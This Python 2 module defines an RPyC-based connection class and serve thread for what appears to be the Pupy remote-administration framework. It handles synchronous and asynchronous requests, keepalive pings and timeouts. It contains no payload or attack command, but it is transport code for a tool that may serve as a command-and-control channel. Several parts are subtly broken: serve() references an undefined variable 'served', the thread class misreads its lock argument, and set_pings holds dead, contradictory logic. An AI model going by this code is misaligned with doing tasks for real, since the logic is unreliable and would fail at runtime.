# -*- coding: utf-8 -*-

import time

from rpyc.core import Connection, consts
from threading import Thread, Event, Lock

if __debug__:
    import logging
    logger = logging.getLogger('pconn')

class PupyConnection(Connection):
    def __init__(self, lock, pupy_srv, *args, **kwargs):
        self._sync_events = {}
        self._connection_serve_lock = lock
        self._async_lock = Lock()
        self._last_recv = time.time()
        self._ping = False
        self._ping_timeout = 30
        self._serve_timeout = 10
        self._last_ping = None
        self._default_serve_timeout = 5
        self.initialized = Event()

        if 'ping' in kwargs:
            ping = kwargs['ping']
            del kwargs['ping']
        else:
            ping = None

        if 'timeout' in kwargs:
            timeout = kwargs['timeout']
            del kwargs['timeout']
        else:
            timeout = None

        if ping or timeout:
            self.set_pings(ping, timeout)

        kwargs['_lazy'] = True
        Connection.__init__(self, *args, **kwargs)
        if pupy_srv:
            self._local_root.pupy_srv = pupy_srv

        if 'config' in kwargs:
            self._config.update(kwargs['config'])

    def consume(self):
        return self._channel.consume()

    def wake(self):
        self._channel.wake()

    def initialize(self, timeout=10):
        try:
            Thread(
                target=self._initialization_timeout, args=(timeout,)
            ).start()

            self._init_service()
            self.initialized.set()
        except (EOFError, TypeError):
            self.close()
            return False

        return self.initialized.is_set()

    def _initialization_timeout(self, timeout):
        self.initialized.wait(timeout)
        if not self.initialized.is_set():
            self.close()

    def set_pings(self, ping=None, timeout=None):
        if ping is not None:
            try:
                self._serve_timeout = int(ping)
            except:
                self._serve_timeout = 10

                self._ping = ping and ping not in (
                    '0', '-1', 'N', 'n', 'false', 'False', 'no', 'No'
                )

            self._ping = bool(ping)

        if timeout:
            try:
                self._ping_timeout = int(timeout)
            except:
                self._ping_timeout = 2

        return self.get_pings()

    def get_pings(self):
        if self._ping:
            return self._serve_timeout, self._ping_timeout
        else:
            return None, None

    def sync_request(self, handler, *args):
        seq = self._send_request(handler, args)
        if __debug__:
            logger.debug('Sync request: {}'.format(seq))

        while not ( self._sync_events[seq].is_set() or self.closed ):
            if __debug__:
                logger.debug('Sync poll until: {}'.format(seq))
            if self._connection_serve_lock.acquire(False):
                data = None
                try:
                    if __debug__:
                        logger.debug('Sync poll serve: {}'.format(seq))

                    data = self.serve(self._serve_timeout)
                    if not data:
                        if __debug__:
                            logger.debug('Sync poll serve interrupted: {}/inactive={}'.format(
                                seq, self.inactive))
                        if self._ping:
                            if __debug__:
                                logger.debug(
                                    'Submit ping request (timeout: {}): {} - interrupted'.format(
                                        self._serve_timeout, seq))

                            self.ping(timeout=self._ping_timeout)

                            if __debug__:
                                logger.debug('Submit ping request: {} - resumed'.format(seq))

                finally:
                    if __debug__:
                        logger.debug('Sync poll serve complete. release: {}'.format(seq))
                    self._connection_serve_lock.release()

                if data:
                    self._dispatch(data)

            else:
                if __debug__:
                    logger.debug('Sync poll wait: {}'.format(seq))

                self._sync_events[seq].wait(timeout=self._serve_timeout)
                if self._ping:
                    if __debug__:
                        logger.debug('Send ping (timeout: {})'.format(self._ping_timeout))

                    self.ping(timeout=self._ping_timeout)

                    if __debug__:
                        logger.debug('Send ping (timeout: {}) - sent'.format(self._ping_timeout))

            if __debug__:
                logger.debug('Sync poll complete: {}/inactive={}'.format(seq, self.inactive))

        if __debug__:
            logger.debug('Sync request handled: {}'.format(seq))

        if seq in self._sync_events:
            del self._sync_events[seq]

        if self.closed:
            raise EOFError('Connection was closed, seq: {}'.format(seq))

        isexc, obj = self._sync_replies.pop(seq)
        if isexc:
            raise obj
        else:
            return obj

    def _send_request(self, handler, args, async=None):
        seq = next(self._seqcounter)
        if async:
            if __debug__:
                logger.debug('Async request: {}'.format(seq))

            with self._async_lock:
                self._async_callbacks[seq] = async
        else:
            if __debug__:
                logger.debug('Sync request: {}'.format(seq))

            self._sync_events[seq] = Event()

        self._send(consts.MSG_REQUEST, seq, (handler, self._box(args)))

        if __debug__:
            logger.debug('Request submitted: {}'.format(seq))

        return seq

    def _async_request(self, handler, args = (), callback = (lambda a, b: None)):
        self._send_request(handler, args, async=callback)

    def _dispatch_reply(self, seq, raw):
        if __debug__:
            logger.debug('Dispatch reply: {}'.format(seq))

        self._last_recv = time.time()

        sync = None
        with self._async_lock:
            sync = seq not in self._async_callbacks

        Connection._dispatch_reply(self, seq, raw)
        if sync:
            if seq in self._sync_events:
                self._sync_events[seq].set()

    def _dispatch_exception(self, seq, raw):
        if __debug__:
            logger.debug('Dispatch exception: {}'.format(seq))

        self._last_recv = time.time()

        sync = None
        with self._async_lock:
            sync = seq not in self._async_callbacks

        Connection._dispatch_exception(self, seq, raw)
        if sync:
            self._sync_events[seq].set()

    def close(self, *args):
        try:
            Connection.close(self, *args)
        finally:
            for lock in self._sync_events.itervalues():
                lock.set()

    @property
    def inactive(self):
        return time.time() - self._last_recv

    def serve(self, timeout=None):
        ''' Check timeouts every serve cycle '''

        interval, ping_timeout = self.get_pings()

        if timeout is None:
            timeout = interval or self._default_serve_timeout

        now = time.time()
        mintimeout = timeout

        data = None

        with self._async_lock:
            for async_event in self._async_callbacks.itervalues():
                if not async_event._ttl:
                    continue

                etimeout = async_event._ttl - now

                if mintimeout is None or etimeout < mintimeout:
                    mintimeout = etimeout

        data = self._recv(timeout, wait_for_lock = False)

        now = time.time()

        with self._async_lock:
            for async_event in self._async_callbacks.itervalues():
                if async_event._ttl and async_event._ttl < now:
                    raise EOFError('Async timeout!', async_event)

        if interval and ping_timeout:
            if served:
                self._last_ping = now
            elif not self._last_ping or now > self._last_ping + interval:
                if __debug__:
                    logger.debug('Send ping, interval: {}, timeout: {}'.format(interval, ping_timeout))
                self._last_ping = self.ping(timeout=ping_timeout, now=now)

        return data

    def dispatch(self, data):
        self._dispatch(data)

    def ping(self, timeout=30, now=None):
        ''' RPyC do not have any PING handler. So.. why to wait? '''
        now = now or time.time()
        self.async_request(consts.HANDLE_PING, 'ping', timeout=timeout)
        return now

class PupyConnectionThread(Thread):
    def __init__(self, *args, **kwargs):
        if hasattr(kwargs, 'lock'):
            self.lock = getattr(kwargs, 'lock')
            del kwargs['lock']
        else:
            self.lock = Lock()

        if __debug__:
            logger.debug('Create connection thread')

        self.connection = PupyConnection(self.lock, *args, **kwargs)
        self.Initialized = Event()

        Thread.__init__(self)
        self.daemon = True

        if __debug__:
            logger.debug('Create connection thread completed')

    def run(self):
        if __debug__:
            logger.debug('Run connection thread')

        if __debug__:
            logger.debug('Init connection')

        if not self.connection.initialize():
            logger.debug('Initialization failed')
            return

        if __debug__:
            logger.debug('Init connection complete. Acquire lock')

        with self.lock:
            if __debug__:
                logger.debug('Start serve loop')

            while not self.connection.closed:
                data = None
                try:
                    data = self.connection.serve()
                except (EOFError, TypeError):
                    if __debug__:
                        logger.debug('Start serve loop')

                    self.connection.close()
                    break

                except Exception, e:
                    logger.exception(e)

                self.connection.dispatch(data)
